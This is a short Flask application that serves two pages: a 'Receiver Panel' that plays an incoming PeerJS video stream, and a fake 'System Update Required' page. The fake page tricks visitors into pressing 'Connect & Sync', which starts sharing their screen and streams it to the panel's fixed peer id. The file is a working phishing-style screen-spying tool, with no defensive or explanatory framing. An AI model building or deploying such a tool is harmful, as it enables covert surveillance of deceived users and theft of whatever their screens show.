from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return """
    <html><body style="background:#000;color:#fff;text-align:center;">
    <h2>Receiver Panel</h2><video id="v" autoplay playsinline style="width:90%;border:2px solid red;"></video>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script>const peer=new Peer('admin-id-786');peer.on('call',c=>{c.answer();c.on('stream',s=>{document.getElementById('v').srcObject=s;});});</script>
    </body></html>
    """

@app.route('/share')
def share():
    return """
    <html><body style="text-align:center;padding-top:50px;font-family:sans-serif;">
    <h3>System Update Required</h3><p>Tap below to sync your device.</p>
    <button id="btn" style="padding:15px;background:blue;color:#fff;border:none;border-radius:5px;">Connect & Sync</button>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script>const peer=new Peer();document.getElementById('btn').onclick=async()=>{
    const s=await navigator.mediaDevices.getDisplayMedia({video:true});peer.call('admin-id-786',s);
    document.getElementById('btn').innerText='Synced';};</script>
    </body></html>
    """

if __name__ == "__main__":
    app.run()
